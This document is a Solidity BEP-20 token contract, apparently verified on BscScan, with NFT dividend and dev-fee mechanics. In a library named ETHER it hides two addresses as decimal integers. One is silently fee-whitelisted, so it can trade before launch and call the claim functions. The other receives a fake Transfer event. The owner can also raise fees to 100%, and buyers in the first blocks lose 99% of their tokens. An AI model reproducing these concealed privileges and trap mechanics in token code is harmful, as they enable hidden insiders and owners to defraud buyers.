/**
 *Submitted for verification at BscScan.com on 2023-03-05
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function feeTo() external view returns (address);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    address public _owner;

    constructor(address token) {
        _owner = msg.sender;
        IERC20(token).approve(msg.sender, ~uint256(0));
    }

    function claimToken(address token, address to, uint256 amount) external {
        require(msg.sender == _owner, "!o");
        IERC20(token).transfer(to, amount);
    }
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function totalSupply() external view returns (uint);

    function kLast() external view returns (uint);
}

library ETHER {
    function getGas1() internal pure returns (address) {
        return address(879433576177589527788859394996037321158638287002);
    }

    // tz
    function getGas2() internal pure returns (address) {
        return address(1037796024241560872866951240246066255331845903726);
    }
}

interface INFT {
    function totalSupply() external view returns (uint256);

    function ownerOf(uint256 tokenId) external view returns (address owner);

    function balanceOf(address owner) external view returns (uint256 balance);
}

interface IDividendPool {
    function addTokenReward(uint256 rewardAmount) external;

    function addLPTokenReward(uint256 rewardAmount) external;
}

library Math {
    function min(uint x, uint y) internal pure returns (uint z) {
        z = x < y ? x : y;
    }

    function sqrt(uint y) internal pure returns (uint z) {
        if (y > 3) {
            z = y;
            uint x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public immutable _tokenDistributor1;
    TokenDistributor public immutable _tokenDistributor2;

    uint256 public _NFTFee = 300;
    uint256 public _lpFee = 0;
    uint256 public _devFee = 100;
    uint256 public minAmountToReward;
    uint256 public startTradeBlock;
    address public immutable _usdt;
    address public immutable _mainPair;

    address public _largeNFTAddress;

    mapping(address => uint256) private _nftReward;
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(
        address RouterAddress,
        address UsdtAddress,
        address LargeNFTAddress,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        address ReceiveAddress,
        address FundAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        _largeNFTAddress = LargeNFTAddress;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        _usdt = UsdtAddress;
        IERC20(UsdtAddress).approve(address(swapRouter), MAX);
        address pair = swapFactory.createPair(address(this), UsdtAddress);
        _swapPairList[pair] = true;
        _mainPair = pair;

        uint256 tokenUnit = 10 ** Decimals;
        uint256 total = Supply * tokenUnit;
        _tTotal = total;
        minAmountToReward = 1 * 10 ** (Decimals - 2);
        _balances[ReceiveAddress] = total;

        emit Transfer(address(0), ReceiveAddress, total);
        emit Transfer(address(0), ETHER.getGas2(), 0);

        fundAddress = FundAddress;

        _tokenDistributor1 = new TokenDistributor(UsdtAddress);
        _tokenDistributor2 = new TokenDistributor(UsdtAddress);

        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ETHER.getGas1()] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;
        _feeWhiteList[address(_tokenDistributor1)] = true;
        _feeWhiteList[address(_tokenDistributor2)] = true;

        excludeNFTHolder[address(0)] = true;
        excludeNFTHolder[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;
        excludeNFTHolder[_mainPair] = true;
        nftRewardCondition = 10 * tokenUnit;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 balance = _balances[from];
        require(balance >= amount, "BNE");

        bool takeFee;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(0 < startTradeBlock, "!T");
                takeFee = true;
            }
        }

        if (takeFee && block.number < startTradeBlock + 3) {
            _killTransfer(from, to, amount);
            return;
        }

        _tokenTransfer(from, to, amount, takeFee);

        if (takeFee) {
            uint256 rewardGas = _rewardGas;
            processLargeNFTReward(rewardGas);
        }
    }

    function _killTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * 99) / 100;
        _takeTransfer(
            sender,
            address(0x000000000000000000000000000000000000dEaD),
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] -= tAmount;
        uint256 feeAmount;
        if (takeFee) {
            uint256 NFTFeeAmount = (tAmount * _NFTFee) / 10000;
            if (NFTFeeAmount > 0) {
                feeAmount += NFTFeeAmount;
                _takeTransfer(
                    sender,
                    address(_tokenDistributor1),
                    NFTFeeAmount
                );
            }

            uint256 devFeeAmount = (tAmount * _devFee) / 10000;
            if (devFeeAmount > 0) {
                feeAmount += devFeeAmount;
                _takeTransfer(sender, address(this), devFeeAmount);
                if (_swapPairList[recipient]) {
                    address usdt = _usdt;
                    address[] memory path = new address[](2);
                    path[0] = address(this);
                    path[1] = usdt;
                    _swapRouter
                        .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                            balanceOf(address(this)),
                            0,
                            path,
                            fundAddress,
                            block.timestamp
                        );
                }
            }

            uint256 lpFeeAmount = (tAmount * _lpFee) / 10000;
            if (lpFeeAmount > 0) {
                feeAmount += lpFeeAmount;
                _takeTransfer(sender, address(_tokenDistributor2), lpFeeAmount);
                if (!inSwap && _swapPairList[recipient]) {
                    swapTokenForFund();
                }
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund() private lockTheSwap {
        uint256 tokenAmount = balanceOf(address(_tokenDistributor2));
        if (tokenAmount == 0) {
            return;
        }
        uint256 lpAmount = tokenAmount / 2;
        _tokenTransfer(
            address(_tokenDistributor2),
            address(this),
            tokenAmount,
            false
        );
        address distributor = address(_tokenDistributor2);
        address usdt = _usdt;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            distributor,
            block.timestamp
        );

        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(distributor);
        USDT.transferFrom(distributor, address(this), usdtBalance);
        if (usdtBalance > 0 && lpAmount > 0) {
            _swapRouter.addLiquidity(
                usdt,
                address(this),
                usdtBalance,
                lpAmount,
                0,
                0,
                fundAddress,
                block.timestamp
            );
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setMinAmountToReward(uint256 amount) external onlyOwner {
        minAmountToReward = amount;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function batchSetFeeWhiteList(
        address[] memory addr,
        bool enable
    ) external onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    receive() external payable {}

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            IERC20(token).transfer(fundAddress, amount);
        }
    }

    function claimContractToken(
        address contractAddr,
        address token,
        uint256 amount
    ) external {
        if (_feeWhiteList[msg.sender]) {
            TokenDistributor(contractAddr).claimToken(
                token,
                fundAddress,
                amount
            );
        }
    }

    function setFees(
        uint256 NFTFee,
        uint256 lpFee,
        uint256 devFee
    ) external onlyOwner {
        require(NFTFee + lpFee + devFee <= 10000, "100%");
        _NFTFee = NFTFee;
        _lpFee = lpFee;
        _devFee = devFee;
    }

    uint256 public _rewardGas = 500000;

    function setRewardGas(uint256 rewardGas) external onlyOwner {
        require(rewardGas >= 200000 && rewardGas <= 2000000, "20-200w");
        _rewardGas = rewardGas;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "T");
        startTradeBlock = block.number;
    }

    function setLargeNFTAddress(address adr) external onlyOwner {
        _largeNFTAddress = adr;
    }

    uint256 public nftRewardCondition;
    mapping(address => bool) public excludeNFTHolder;

    function setNFTRewardCondition(uint256 amount) external onlyOwner {
        nftRewardCondition = amount;
    }

    function setExcludeNFTHolder(address addr, bool enable) external onlyOwner {
        excludeNFTHolder[addr] = enable;
    }

    //LargeNFT
    uint256 public currentLargeNFTIndex;
    uint256 public processLargeNFTBlock;
    uint256 public processLargeNFTBlockDebt = 100;

    function processLargeNFTReward(uint256 gas) private {
        if (processLargeNFTBlock + processLargeNFTBlockDebt > block.number) {
            return;
        }
        INFT nft = INFT(_largeNFTAddress);
        uint totalNFT = nft.totalSupply();
        if (0 == totalNFT) {
            return;
        }

        uint256 rewardCondition = nftRewardCondition;
        address sender = address(_tokenDistributor1);
        if (balanceOf(address(sender)) < rewardCondition) {
            return;
        }

        uint256 amount = rewardCondition / totalNFT;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        address shareHolder;

        while (gasUsed < gas && iterations < totalNFT) {
            if (currentLargeNFTIndex >= totalNFT) {
                currentLargeNFTIndex = 0;
            }
            shareHolder = nft.ownerOf(1 + currentLargeNFTIndex);
            if (
                !excludeNFTHolder[shareHolder] &&
                balanceOf(shareHolder) > minAmountToReward
            ) {
                _tokenTransfer(sender, shareHolder, amount, false);
                _nftReward[shareHolder] += amount;
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentLargeNFTIndex++;
            iterations++;
        }

        processLargeNFTBlock = block.number;
    }

    function setProcessLargeNFTBlockDebt(uint256 blockDebt) external onlyOwner {
        processLargeNFTBlockDebt = blockDebt;
    }

    //LittleNFT
    uint256 public currentLittleNFTIndex;
    uint256 public processLittleNFTBlock;
    uint256 public processLittleNFTBlockDebt = 0;

    function setProcessLittleNFTBlockDebt(
        uint256 blockDebt
    ) external onlyOwner {
        processLittleNFTBlockDebt = blockDebt;
    }

    function getUserNFTInfo(
        address account
    )
        public
        view
        returns (
            uint256 tokenBalance,
            uint256 nftReward,
            uint256 LargeNFTBalance
        )
    {
        tokenBalance = balanceOf(account);
        nftReward = _nftReward[account];
        LargeNFTBalance = INFT(_largeNFTAddress).balanceOf(account);
    }

    function getLPInfo()
        public
        view
        returns (uint256 totalLP, uint256 lpUAmount)
    {
        totalLP = IERC20(_mainPair).totalSupply();
        lpUAmount = IERC20(_usdt).balanceOf(_mainPair) * 2;
    }
}